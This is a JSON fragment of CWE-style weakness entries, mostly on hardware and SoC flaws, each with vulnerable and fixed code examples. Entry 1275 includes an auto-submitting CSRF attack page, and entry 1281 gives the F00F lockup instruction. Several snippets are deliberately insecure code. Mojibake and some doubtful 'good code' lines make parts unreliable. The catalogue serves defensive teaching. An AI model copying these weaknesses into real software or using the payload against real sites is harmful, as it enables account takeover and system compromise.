        "demonstrative_examples": "Example 1 Consider a system with a register for storing an AES key for encryption or decryption. The key is composed of 128 bits implemented as a set of four 32-bit registers. The key registers are resources and registers, AES_KEY_CONTROL_POLICY, AES_KEY_READ_POLICY and AES_KEY_WRITE_POLICY, and are defined to provide necessary, access controls. The control-policy register defines which agents can write to the read-policy and write-policy registers. The read-policy register defines which agents can read the AES-key registers, and write-policy register defines which agents can program or write to those registers. Each 32-bit register can support access control for a maximum of 32 agents. The number of the bit when set (i.e., \"1\") allows respective action from an agent whose identity matches the number of the bit and, if \"0\" (i.e., Clear), disallows the respective action to that corresponding agent. (bad code) Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_3 AES key [96:127] for encryption or decryption Default 0x00000000 AES_KEY_CONTROL_POLICY [31:0] Default 0x00000018, meaning agent with identities \"4\" and \"3\" has read/write access to this register (i.e., AES_KEY_CONTROL_POLICY), AES_KEY_READ_POLICY, and AES_KEY_WRITE_POLICY registers AES_KEY_READ_POLICY [31:0] Default 0x00000002, agent with identity \"1\" can only read AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers AES_KEY_WRITE_POLICY [31:0] Default 0x00000004, agent with identity \"2\" can only write to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers In the above example, the AES_KEY_CONTROL_POLICY register has agents with identities \"4\"and \"3\" in its policy. Assuming the agent with identity \"4\" is trusted and the agent with identity \"3\" is untrusted. The untrusted agent \"3\" can write to AES_KEY_WRITE_POLICY with a value of 0x0000000C thus allowing write access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers. The AES_KEY_CONTROL_POLICY defines which agents have write access to the AES_KEY_CONTROL_POLICY, AES_KEY_READ_POLICY, and the AES_KEY_WRITE_POLICY registers, The AES-key registers can only be read or used by a crypto agent with identity \"1\" when bit #1 is set. The AES-key registers can only be programmed by a trusted firmware with identity \"2\" when bit #2 is set. For the above example, the control, read-and-write-policy registers\u00e2\\x80\\x99 values are defined as below. (good code) Register Field description AES_KEY_CONTROL_POLICY [31:0] Default 0x00000010, meaning only agents with an identity of \"4\" have read/write access to this register (i.e., AES_KEY_CONTROL_POLICY), AES_KEY_READ_POLICY, and AES_KEY_WRITE_POLICY registers AES_KEY_READ_POLICY [31:0] Default 0x00000002, meaning only trusted firmware with an identity of \"1\" can program registers: \\nAES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3 AES_KEY_WRITE_POLICY [31:0] Default 0x00000004, meaning only trusted firmware with an identity of \"2\" can program registers: \\nAES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3"
    },
    {
        "id": 1269,
        "demonstrative_examples": "Example 1 This example shows what happens when a preproduction system is made available for production. (bad code) Suppose the chipmaker has a way of scanning all the internal memory (containing chipmaker-level secrets) during the manufacturing phase, and the way the chipmaker or the Original Equipment Manufacturer (OEM) marks the end of the manufacturing phase is by blowing a Manufacturing Complete fuse. Now, suppose that whoever blows the Manufacturing Complete fuse inadvertently forgets to execute the step to blow the fuse. An attacker will now be able to scan all the internal memory (containing chipmaker-level secrets). (good code) Blow the Manufacturing Complete fuse."
    },
    {
        "id": 1270,
        "demonstrative_examples": "Example 1 Consider a system with a register for storing an AES key for encryption or decryption. The key is 128 bits long implemented as a set of four 32-bit registers. The key registers are assets, and register, AES_KEY_ACCESS_POLICY, is defined to provide necessary access controls. The access-policy register defines which agents, using a Security Token, may access the AES-key registers. Each bit in this 32-bit register is used to define a Security Token. There could be a maximum of 32 Security Tokens that are allowed access to the AES-key registers. When set (bit = \"1\") bit number allows action from an agent whose identity matches that bit number. If Clear (bit = \"0\") the action is disallowed for the corresponding agent. Let\"s assume the system has two agents: a Main-controller and an Aux-controller. The respective Security Tokens are \"1\" and \"2\". Register Description Default AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_3 AES key [96:127] for encryption or decryption 0x00000000 AES_KEY_ACCESS_POLICY AES key access register [31:0] 0x00000002 An agent with a Security Token \"1\" has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers. As per the above access policy, the AES-Key-access policy allows access to the AES-key registers if the security Token is \"1\". (bad code) Example Language: Other The SoC incorrectly generates Security Token \"1\" for every agent. In other words, both Main-controller and Aux-controller are assigned Security Token \"1\". Both agents have access to the AES-key registers. (good code) Example Language: Other The SoC should correctly generate Security Tokens, assigning \"1\" to the Main-controller and \"2\" to the Aux-controller"
    },
    {
        "id": 1271,
        "demonstrative_examples": "Example 1 Shown below is a positive clock edge triggered flip-flop used to implement a lock bit for test and debug interface. When the circuit is first brought out of reset, the state of the flip-flop will be unknown until the enable input and D-input signals update the flip-flop state. In this example, an attacker can reset the device until the test and debug interface is unlocked and access the test interface until the lock signal is driven to a known state by the logic. (bad code) Example Language: Other always @(posedge clk) begin if (en) lock_jtag <= d; end The flip-flop can be set to a known value (0 or 1) on reset, but requires that the logic explicitly update the output of the flip-flop if the reset signal is active. (good code) Example Language: Other always @(posedge clk) begin if (~reset) lock_jtag <= 0; else if (en) lock_jtag <= d; end"
    },
    {
        "id": 1272,
        "demonstrative_examples": "Example 1 This example shows how an attacker can take advantage of an incorrect state transition. (bad code) Suppose a device is transitioning from state A to state B. During state A, it can read certain private keys from the hidden fuses that are only accessible in state A but not in state B. The device reads the keys, performs operations using those keys, then transitions to state B where those private keys should no longer be accessible. However, during this transition, the device does not scrub the memory. After the transition to state B, even though the private keys are no longer accessible directly from the fuses in state B, they can be accessed indirectly by reading the memory which contains the private keys. (good code) For transition from state A to state B remove information which should not be available once the transition is complete."
    },
    {
        "id": 1273,
        "demonstrative_examples": "Example 1 This example shows how an attacker can take advantage of compromised credentials. (bad code) Suppose a semiconductor chipmaker, \u00e2\\x80\\x9cC\u00e2\\x80\\x9d, uses the foundry \u00e2\\x80\\x9cF\u00e2\\x80\\x9d for fabricating its chips. Now, F has many other customers in addition to C, and some of the other customers are much smaller companies. F has dedicated teams for each of its customers, but somehow it mixes up the unlock credentials and sends the unlock credentials of C to the wrong team. This other team does not take adequate precautions to protect the credentials that have nothing to do with them, and eventually the unlock credentials of C get leaked. When the credentials of multiple organizations are stored together, exposure to third parties occurs frequently. (good code) Vertical integration of a production company is one effective method of protecting sensitive credentials. Where vertical integration is not possible, strict access control and need-to-know are methods which can be implenmented to reduce these risks."
    },
    {
        "id": 1274,
        "demonstrative_examples": "Example 1 A typical SoC secure boot\u00e2\\x80\\x99s flow includes fetching the next piece of code (i.e., the boot loader) from NVM (e.g., serial, peripheral interface (SPI) flash), and transferring it to DRAM/SRAM volatile, internal memory. The advantage of using DRAM/SRAM is that the access time is faster and cheaper per byte than NVM. (bad code) The volatile-memory protections or access controls are insufficient. The memory from where the boot loader executes can be modified by an adversary. (good code) A good architecture should define appropriate protections or access controls to prevent modification by an adversary or untrusted agent, once the bootloader is authenticated."
    },
    {
        "id": 1275,
        "demonstrative_examples": "Example 1 \"In this example, a cookie is used to store a session ID for a client's interaction with a website. The snippet of code below establishes a new cookie to hold the sessionID.\" (bad code) Example Language: JavaScript let sessionId = generateSessionId() \"let cookieOptions = { domain: 'example.com' }\" \"response.cookie('sessionid', sessionId, cookieOptions)\" Since the sameSite attribute is not specified, the cookie will be sent to the website with each request made by the client. An attacker who can potentially perform CSRF attack by using the following malicious page: (attack code) Example Language: HTML <html> <form id=evil action=\"http://local:3002/setEmail\" method=\"POST\"> <input type=\"hidden\" name=\"newEmail\" value=\"abc@example.com\" /> </form> <script>evil.submit()</script> </html> \"When the client visits this malicious web page, it submits a '/setEmail' POST HTTP request to the vulnerable website. Since the browser automatically appends the 'sessionid' cookie to the request, the website automatically performs a 'setEmail' action on behalf of the client.\" \"To mitigate the risk, use the sameSite attribute of the 'sessionid' cookie set to 'Strict'.\" (good code) Example Language: JavaScript let sessionId = generateSessionId() \"let cookieOptions = { domain: 'example.com', sameSite: 'Strict' }\" \"response.cookie('sessionid', sessionId, cookieOptions\""
    },
    {
        "id": 1276,
        "demonstrative_examples": "Example 1 Many SoCs use hardware to partition system resources between trusted and un-trusted entities. One example of this concept is the Arm TrustZone, in which the processor and all security-aware IP attempt to isolate resources based on the status of a privilege bit. This privilege bit is part of the input interface in all TrustZone-aware IP. If this privilege bit is accidentally grounded or left unconnected when the IP is instantiated, privilege escalation of all input data may occur. (bad code) Example Language: Verilog // IP definition module tz_peripheral(clk, reset, data_in, data_in_security_level, ...); input clk, reset; input [31:0] data_in; input data_in_security_level; ... endmodule // Instantiation of IP in a parent system module soc(...) ... tz_peripheral u_tz_peripheral( .clk(clk), .rst(rst), .data_in(rdata), //Copy-and-paste error or typo grounds data_in_security_level (in this example 0=secure, 1=non-secure) effectively promoting all data to \u00e2\\x80\\x9csecure\u00e2\\x80\\x9d) \".data_in_security_level(1'b0),\" ); ... endmodule In the Verilog code below, the security level input to the TrustZone aware peripheral is correctly driven by an appropriate signal instead of being grounded. (good code) Example Language: Verilog // Instantiation of IP in a parent system module soc(...) ... tz_peripheral u_tz_peripheral( .clk(clk), .rst(rst), .data_in(rdata), // This port is no longer grounded, but instead drive by the appropriate signal .data_in_security_level(rdata_security_level), ); ... endmodule"
    },
    {
        "id": 1277,
        "demonstrative_examples": "Example 1 A refrigerator has an Internet interface for the official purpose of alerting the manufacturer when that refrigerator detects a fault. Because the device is attached to the Internet, the refrigerator is a target for hackers who may wish to use the device other potentially more nefarious purposes. (bad code) Example Language: Other The refrigerator has no means of patching and is hacked becoming a spewer of email spam. (good code) Example Language: Other The device automatically patches itself and provides considerable more protection against being hacked."
    },
    {
        "id": 1278,
        "demonstrative_examples": "Example 1 Consider an SoC design that embeds a secret key in read-only memory (ROM). The key is baked into the design logic and may not be modified after fabrication causing the key to be identical for all devices.  An attacker in possession of the IC can decapsulate and delayer the device. After imaging the layers, computer vision algorithms or manual inspection of the circuit features locate the ROM and reveal the value of the key bits as encoded in the visible circuit structure of the ROM."
    },
    {
        "id": 1279,
        "demonstrative_examples": "Example 1 The following pseudocode illustrates the weak encryption resulting from the use of a pseudo-random-number generator output. (bad code) Example Language: Other If random_number_generator_self_test_passed() == TRUE then Seed = get_random_number_from_RNG() else Seed = hardcoded_number In the example above, first a check of RNG ready is performed. If the check fails, the RNG is ignored and a hard coded value is used instead. The hard coded value severely weakens the encrypted output. (good code) Example Language: Other If random_number_generator_self_test_passed() == TRUE then Seed = get_random_number_from_RNG() else enter_error_state()"
    },
    {
        "id": 1280,
        "demonstrative_examples": "Example 1 Assume that the module foo_bar implements a protected register. The register content is the asset. Only transactions made by user id (indicated by signal usr_id) 0x4 are allowed to modify the register contents. The signal grant_access is used to provide access. (bad code) Example Language: Verilog module foo_bar(data_out, usr_id, data_in, clk, rst_n); output reg [7:0] data_out;; input wire [2:0] usr_id; input wire [7:0] data_in; input wire clk, rst_n; wire grant_access; always @ (posedge clk or negedge rst_n) begin if (!rst_n) data_out = 0; else data_out = (grant_access) ? data_in : data_out; assign grant_access = (usr_id == 3\u00e2\\x80\\x99h4) ? 1\u00e2\\x80\\x99b1 : 1\u00e2\\x80\\x99b0; end endmodule This code uses Verilog blocking assignments for data_out and grant_access. Therefore, these assignments happen sequentially (i.e., data_out is updated to new value first, and grant_access is updated the next cycle) and not in parallel. Therefore, the asset data_out is allowed to be modified even before the access control check is complete and grant_access signal is set. Since grant_access does not have a reset value, it will be meta-stable and will randomly go to either 0 or 1. (good code) Example Language: Verilog Flipping the order of the assignment of data_out and grant_access should solve the problem. The correct snippet of code is shown below. always @ (posedge clk or negedge rst_n) begin if (!rst_n) data_out = 0; else assign grant_access = (usr_id == 3\u00e2\\x80\\x99h4) ? 1\u00e2\\x80\\x99b1 : 1\u00e2\\x80\\x99b0; data_out = (grant_access) ? data_in : data_out; end endmodule"
    },
    {
        "id": 1281,
        "demonstrative_examples": "Example 1 The Pentium F00F bug is a real-world example of how a sequence of instructions can lock a processor. The \u00e2\\x80\\x9ccmpxchg8b\u00e2\\x80\\x9d instruction compares contents of registers with a memory location.  The operand is expected to be a memory location, but in the bad code snippet it is the eax register. Because the specified operand is illegal, an exception is generated, which is the correct behavior and not a security issue in itself. However, when prefixed with the \u00e2\\x80\\x9clock\u00e2\\x80\\x9d instruction, the processor deadlocks because locked memory transactions require a read and write pair of transactions to occur before the lock on the memory bus is released. The exception causes a read to occur but there is no corresponding write, as there would have been if a legal operand had been supplied to the cmpxchg8b instruction. (bad code) Example Language: Other lock cmpxchg8b eax"
    },
    {
        "id": 1282,
        "demonstrative_examples": "Example 1 Cryptographic hash functions are commonly used to create unique fixed-length digests used to ensure the integrity of code and keys. A golden digest is stored on the device and compared to the digest computed from the data to be verified. If the digests match, the data has not been maliciously modified. If an attacker can modify the golden digest they then have the ability to store arbitrary data that passes the verification check. Hash digests used to verify public keys and early stage boot code should be immutable, with the strongest protection offered by hardware immutability."
    },
    {
        "id": 1283,
        "demonstrative_examples": "Example 1 The SoC extends the hash and stores the results in registers. Without protection, an adversary can write their chosen hash values to these registers. Thus, the attacker controls the reported results. To prevent the above scenario, the registers should have one or more of the following properties: Should be Read-Only with respect to an adversary Cannot be extended or modifiable either directly or indirectly (using a trusted agent as proxy) by an adversary Should have appropriate access controls or protections"
    },
    {
        "id": 1284,
        "demonstrative_examples": "Example 1 This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated. (bad code) Example Language: Java ... public static final double price = 20.00; int quantity = currentUser.getAttribute(\"quantity\"); double total = price * quantity; chargeUser(total); ... The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited. Example 2 This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares. (bad code) Example Language: C ... #define MAX_DIM 100 ... /* board dimensions */ int m,n, error; board_square_t *board; printf(\"Please specify the board height: \\\\n\"); error = scanf(\"%d\", &m); if ( EOF == error ){ die(\"No integer passed: Die evil hacker!\\\\n\"); } printf(\"Please specify the board width: \\\\n\"); error = scanf(\"%d\", &n); if ( EOF == error ){ die(\"No integer passed: Die evil hacker!\\\\n\"); } if ( m > MAX_DIM || n > MAX_DIM ) { die(\"Value too large: Die evil hacker!\\\\n\"); } board = (board_square_t*) malloc( m * n * sizeof(board_square_t)); ... While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption ( CWE-400 ) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation ( CWE-789 ) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow ( CWE-190 ) and unexpected behavior will follow depending on how the values are treated in the remainder of the program."
    },
    {
        "id": 1285,
        "demonstrative_examples": "Example 1 The following example retrieves the sizes of messages for a pop3 mail server. The message sizes are retrieved from a socket that returns in a buffer the message number and the message size, the message number (num) and size (size) are extracted from the buffer and the message size is placed into an array using the message number for the array index. (bad code) Example Language: C /* capture the sizes of all messages */ int getsizes(int sock, int count, int *sizes) { ... char buf[BUFFER_SIZE]; int ok; int num, size; // read values from socket and added to sizes array while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0) { \"// continue read from socket until buf only contains '.'\" if (DOTLINE(buf)) break; else if (sscanf(buf, \"%d %d\", &num, &size) == 2) sizes[num - 1] = size; } ... } In this example the message number retrieved from the buffer could be a value that is outside the allowable range of indices for the array and could possibly be a negative number. Without proper validation of the value to be used for the array index an array overflow could occur and could potentially lead to unauthorized access to memory addresses and system crashes. The value of the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code. (good code) Example Language: C /* capture the sizes of all messages */ int getsizes(int sock, int count, int *sizes) { ... char buf[BUFFER_SIZE]; int ok; int num, size; // read values from socket and added to sizes array while ((ok = gen_recv(sock, buf, sizeof(buf))) == 0) { \"// continue read from socket until buf only contains '.'\" if (DOTLINE(buf)) break; else if (sscanf(buf, \"%d %d\", &num, &size) == 2) { if (num > 0 && num <= (unsigned)count) sizes[num - 1] = size; else /* warn about possible attempt to induce buffer overflow */ report(stderr, \"Warning: ignoring bogus data for message sizes returned by server.\\\\n\"); } } ... } Example 2 In the following example the method displayProductSummary is called from a Web service servlet to retrieve product summary information for display to the user. The servlet obtains the integer value of the product number from the user and passes it to the displayProductSummary method. The displayProductSummary method passes the integer value of the product number to the getProductSummary method which obtains the product summary from the array object containing the project summaries using the integer value of the product number as the array index. (bad code) Example Language: Java // Method called from servlet to obtain product information public String displayProductSummary(int index) { String productSummary = new String(\"\"); try { String productSummary = getProductSummary(index); } catch (Exception ex) {...} return productSummary; } public String getProductSummary(int index) { return products[index]; } In this example the integer value used as the array index that is provided by the user may be outside the allowable range of indices for the array which may provide unexpected results or cause the application to fail. The integer value used for the array index should be validated to ensure that it is within the allowable range of indices for the array as in the following code. (good code) Example Language: Java // Method called from servlet to obtain product information public String displayProductSummary(int index) { String productSummary = new String(\"\"); try { String productSummary = getProductSummary(index); } catch (Exception ex) {...} return productSummary; } public String getProductSummary(int index) { String productSummary = \"\"; if ((index >= 0) && (index < MAX_PRODUCTS)) { productSummary = products[index]; } else { System.err.println(\"index is out of bounds\"); throw new IndexOutOfBoundsException(); } return productSummary; } An alternative in Java would be to use one of the collection objects such as ArrayList that will automatically generate an exception if an attempt is made to access an array index that is out of bounds. (good code) Example Language: Java ArrayList productArray = new ArrayList(MAX_PRODUCTS); ... try { productSummary = (String) productArray.get(index); } catch (IndexOutOfBoundsException ex) {...} Example 3 The following example asks a user for an offset into an array to select an item. (bad code) Example Language: C int main (int argc, char **argv) { char *items[] = {\"boat\", \"car\", \"truck\", \"train\"}; int index = GetUntrustedOffset(); printf(\"User selected %s\\\\n\", items[index-1]); } The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read ( CWE-126 )."
    },
    {
        "id": 1286,
        "demonstrative_examples": "Example 1 The following code loads and parses an XML file. (bad code) Example Language: Java // Read DOM try { ... DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setValidating( false ); .... c_dom = factory.newDocumentBuilder().parse( xmlFile ); } catch(Exception ex) { ... } The XML file is loaded without validating it against a known XML Schema or DTD."
    },
    {
        "id": 1287,
        "demonstrative_examples": ""
    },
    {
        "id": 1288,
        "demonstrative_examples": ""
    },
    {
        "id": 1289,
        "demonstrative_examples": ""
    },
    {
        "id": 1290,
        "demonstrative_examples": "Example 1 Consider a system that has four bus masters and a decoder. The table below provides bus masters as well as their security identifiers and trust assumptions: Bus Master Security Identifier Decoding Trust Assumptions Master_0 \"00\" Untrusted Master_1 \"01\" Trusted Master_2 \"10\" Untrusted Master_3 \"11\" Untrusted The decoder is supposed to decode every bus transaction and assign a corresponding security identifier. The security identifier is used to determine accesses to the assets. The bus transaction that contains the security information is Bus_transaction [15:14], and the bits 15 through 14 contain the security identifier in formation. The assets are the AES-Key register\u00e2\\x80\\x99s AES key for encryption or decryption. The key is128 bits implemented as a set of four 32-bit registers. The key registers are assets, and register AES_KEY_ACCESS_POLICY is defined to provide the necessary access controls.\\nThe access-policy register defines which agents with a security identifier in the transaction can access the AES-key registers. The size of the security identifier is 4 bits (i.e., bit 3 through 0. Each bit in these 4 bits defines a security identifier. There are only 4 security identifiers that are allowed accesses to the AES-key registers. The number of the bit when set (i.e., \u00e2\\x80\\x9c1\u00e2\\x80\\x9d) allows respective action from an agent whose identity matches the number of the bit and, if \u00e2\\x80\\x9c0\u00e2\\x80\\x9d (i.e., Clear), disallows the respective action to that corresponding agent. Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption\\nDefault 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption\\nDefault 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption\\nDefault 0x00000000 AES_ENC_DEC_KEY_3 AES key [96:127] for encryption or decryption\\nDefault 0x00000000 AES_KEY_ACCESS_POLICY [31:4] Default 0x000000\\n[3:0] \u00e2\\x80\\x93 0x02 agent with Security Identifier \u00e2\\x80\\x9c1\u00e2\\x80\\x9d has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registers Pseudo Code If (AES_KEY_ACCESS_POLICY[Security_Identifier] == \u00e2\\x80\\x9c1\u00e2\\x80\\x9d) Allow access to AES-Key registers Else Deny access to AES-Key registers (bad code) Example Language: Other Below is a decoder\u00e2\\x80\\x99s Pseudo code that only checks for bit [14] of the bus transaction to determine what Security Identifier it must assign. If (Bus_transaction[14] == \u00e2\\x80\\x9c1\u00e2\\x80\\x9d) Security_Identifier == \u00e2\\x80\\x9c1\u00e2\\x80\\x9d Else Security_Identifier == \u00e2\\x80\\x9c0\u00e2\\x80\\x9d Upon close observation of the security identifiers and the above code, it looks like the Master_3, an untrusted agent, has access to the AES-Key registers in addition to the intended trusted Master_1 because both have their bit \u00e2\\x80\\x9c0\u00e2\\x80\\x9d set to \u00e2\\x80\\x9c1\u00e2\\x80\\x9d. (good code) Example Language: Other The decoder should check for the entire size of the security identifier in the bus-transaction signal to assign acorresponding security identifier. The following is good Pseudo code: If (Bus_transaction[15:14] == \u00e2\\x80\\x9c00\u00e2\\x80\\x9d) Security_Identifier == \u00e2\\x80\\x9c0\u00e2\\x80\\x9d If (Bus_transaction[15:14] == \u00e2\\x80\\x9c01\u00e2\\x80\\x9d) Security_Identifier == \u00e2\\x80\\x9c1\u00e2\\x80\\x9d If (Bus_transaction[15:14] == \u00e2\\x80\\x9c10\u00e2\\x80\\x9d) Security_Identifier == \u00e2\\x80\\x9c2\u00e2\\x80\\x9d If (Bus_transaction[15:14] == \u00e2\\x80\\x9c11\u00e2\\x80\\x9d) Security_Identifier == \u00e2\\x80\\x9c3\u00e2\\x80\\x9d"
    },
    {
        "id": 1291,
        "demonstrative_examples": "Example 1 This example illustrates the danger of using the same public key for debug and production. (bad code) Example Language: Other Suppose the product design requires frugality of silicon real estate. Assume that originally the architecture allows just enough storage for two 2048-bit RSA keys in the fuse: one to be used for debug and the other for production. However, in the meantime, a business decision is taken to make the security future-proof beyond 2030, which means the architecture needs to use the NIST-recommended 3072-bit keys instead of the originally-planned 2048-bit keys. This means that, at most, one key can be fully stored in the fuses, not two. So the product design team decides to use the same public key for debug and production. (informative) Example Language: Other Increase the storage so that two different keys of the required size can be stored."
    },
    {
        "id": 1292,
        "demonstrative_examples": "Example 1 Consider a system that supports AHB. Let us assume we have a follower agent that only understands OCP. To connect this follower to the leader, a bridge is introduced, i.e., AHB to OCP. The follower has assets to protect accesses from untrusted leaders, and it employs access controls based on policy, (e.g., AES-Key registers for encryption or decryption). The key is 128 bits implemented as a set of four 32-bit registers. The key registers are assets, and register AES_KEY_ACCESS_POLICY is defined to provide the necessary access controls. The AES_KEY_ACCESS_POLICY access-policy register defines which agents with a security identifier in the transaction can access the AES-key registers. The implemented AES_KEY_ACCESS_POLICY has 4 bits where each bit when \u00e2\\x80\\x9cSet\u00e2\\x80\\x9d allows access to the AES-Key registers to the corresponding agent that has the security identifier. The other bits from 31 through 4 are reserved and not used. Register Field Description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption Default 0x00000000 AES_ENC_DEC_KEY_3 AES key [96:127] for encryption or decryption Default 0x00000000 AES_KEY_ACCESS_POLICY [31:4] Default 0x000000 [3:0] \u00e2\\x80\\x93 0x02 agent with Security Identifier \u00e2\\x80\\x9c1\u00e2\\x80\\x9d has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registers During conversion of the AHB-to-OCP transaction, the security identifier information must be preserved and passed on to the follower correctly. (bad code) Example Language: Other In AHB-to-OCP bridge, the security identifier information conversion is done incorrectly. Because of the incorrect conversion, the security identifier information is either lost or could be modified in such a way that an untrusted leader can access the AES-Key registers. (good code) Example Language: Other The conversion of the signals from one protocol (AHB) to another (OCP) must be done while preserving the security identifier correctly."
    },
    {
        "id": 1293,
        "demonstrative_examples": ""
    },
    {
        "id": 1294,
        "demonstrative_examples": ""
    },
    {
        "id": 1295,
        "demonstrative_examples": "Example 1 This example here shows how an attacker can take advantage of unnecessary information in debug messages. Example 1: Suppose in response to a Test Access Port (TAP) chaining request the debug message also reveals the current TAP hierarchy (the full topology) in addition to the success/failure message. Example 2: In response to a password-filling request, the debug message, instead of a simple Granted/Denied response, prints an elaborate message, \u00e2\\x80\\x9cThe user-entered password does not match the actual password stored in <directory name>.\u00e2\\x80\\x9d The result of the above examples is that the user is able to gather additional unauthorized information about the system from the debug messages. The solution is to ensure that Debug messages do not reveal additional details."
    },
    {
        "id": 1296,
        "demonstrative_examples": "Example 1 The following example shows how an attacker can take advantage of incorrect chaining or missing granularity of debug components. In a System-on-Chip (SoC), the user might be able to access the SoC-level TAP with a certain level of authorization. However, this access should not also grant access to all of the internal TAPs (e.g., Core). Separately, if any of the internal TAPs is also stitched to the TAP chain when it should not be because of a logic error, then an attacker can access the internal TAPs as well and execute commands there. As a related example, suppose there is a hierarchy of TAPs (TAP_A is connected to TAP_B and TAP_C, then TAP_B is connected to TAP_D and TAP_E, then TAP_C is connected to TAP_F and TAP_G, etc.).  Architecture mandates that the user have one set of credentials for just accessing TAP_A, another set of credentials for accessing TAP_B and TAP_C, etc. However, if, during implementation, the designer mistakenly implements a daisy-chained TAP where all the TAPs are connected in a single TAP chain without the hierarchical structure, the correct granularity of debug components is not implemented and the attacker can gain unauthorized access."
    },
    {
        "id": 1298,
        "demonstrative_examples": "Example 1 The code below shows a 2x1 multiplexor using logic gates. Though the code shown below results in the minimum gate solution, it is disjoint and causes glitches. (bad code) Example Language: Verilog // 2x1 Multiplexor using logic-gates module glitchEx( input wire in0, in1, sel, output wire z ); wire not_sel; wire and_out1, and_out2; assign not_sel = ~sel; assign and_out1 = not_sel & in0; assign and_out2 = sel & in1; // Buggy line of code: assign z = and_out1 | and_out2; // glitch in signal z endmodule \"The buggy line of code, commented above, results in signal 'z' periodically changing to an unwanted state. Thus, any logic that references signal 'z' may access it at a time when it is in this unwanted state. This line should be replaced with the line shown below in the Good Code Snippet which results in signal 'z' remaining in a continuous, known, state. Reference for the above code, along with waveforms for simulation can be found in the references below.\" (good code) Example Language: Verilog assign z <= and_out1 or and_out2 or (in0 and in1); This line of code removes the glitch in signal z."
    },
    {
        "id": 1299,
        "demonstrative_examples": "Example 1 Register SECURE_ME is located at address 0xF00. A\\n                            mirror of this register called COPY_OF_SECURE_ME is\\n                            at location 0x800F00. The register SECURE_ME is\\n                            protected from malicious agents and only allows\\n                            access to select, while COPY_OF_SECURE_ME is not. Access control is implemented using an allowlist (as\\n                            indicated by acl_oh_allowlist). The identity of the\\n                            initiator of the transaction is indicated by the\\n                            one hot input, incoming_id. This is checked against\\n                            the acl_oh_allowlist (which contains a list of\\n                            initiators that are allowed to access the asset). Though this example is shown in Verilog, it will\\n                            apply to VHDL as well. (informative) Example Language: Verilog module foo_bar(data_out, data_in, incoming_id, address, clk, rst_n); output [31:0] data_out; input [31:0] data_in, incoming_id, address; input clk, rst_n; wire write_auth, addr_auth; reg [31:0] data_out, acl_oh_allowlist, q; assign write_auth = | (incoming_id & acl_oh_allowlist) ? 1 : 0; always @* acl_oh_allowlist <= 32\u00e2\\x80\\x99h8312; assign addr_auth = (address == 32\u00e2\\x80\\x99hF00) ? 1: 0; always @ (posedge clk or negedge rst_n) if (!rst_n) begin q <= 32\u00e2\\x80\\x99h0; data_out <= 32\u00e2\\x80\\x99h0; end else begin q <= (addr_auth & write_auth) ? data_in: q; data_out <= q; end end endmodule (bad code) Example Language: Verilog assign addr_auth = (address == 32\u00e2\\x80\\x99hF00) ? 1: 0; The bugged line of code is repeated in the Bad\\n                        example above. Weakness arises from the fact that the\\n                        SECURE_ME register can be modified by writing to the\\n                        shadow register COPY_OF_SECURE_ME, the address of\\n                        COPY_OF_SECURE_ME should also be included in the check.\\n                        That buggy line of code should instead be replaced as\\n                        shown in the Good Code Snippet below. (good code) Example Language: Verilog assign addr_auth = (address == 32\u00e2\\x80\\x99hF00 || address == 32\u00e2\\x80\\x99h800F00) ? 1: 0;"
    },
    {
        "id": 1300,
        "demonstrative_examples": ""
    },
    {
        "id": 1301,
        "demonstrative_examples": ""
    },
    {
        "id": 1302,
